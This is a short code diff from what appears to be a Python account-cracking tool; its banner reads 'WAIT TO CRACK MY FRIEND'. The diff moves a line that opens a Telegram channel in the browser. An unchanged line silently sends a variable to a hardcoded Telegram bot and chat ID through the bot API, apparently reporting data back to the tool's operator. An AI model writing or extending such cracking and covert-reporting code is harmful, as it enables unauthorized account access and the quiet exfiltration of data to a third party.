@@ -43,6 +43,8 @@ E = '\033[1;31m'
 B = '\033[2;36m'
 G = '\033[1;32m'
 S = '\033[1;33m'
+import webbrowser
+webbrowser.open('https://t.me/SGS5G')
 print('')
 print('\n')
 print('''
@@ -69,10 +71,6 @@ WAIT TO CRACK MY FRIEND ♡
 <><><><><><><><><><><><><><>
 @uvuxv ¦ @SGS5G'''
 requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(KV))
-os.system('clear')
-import webbrowser
-webbrowser.open('https://t.me/SGS5G')
-
 os.system('clear')
 pretty.install()
 CON=sol() 
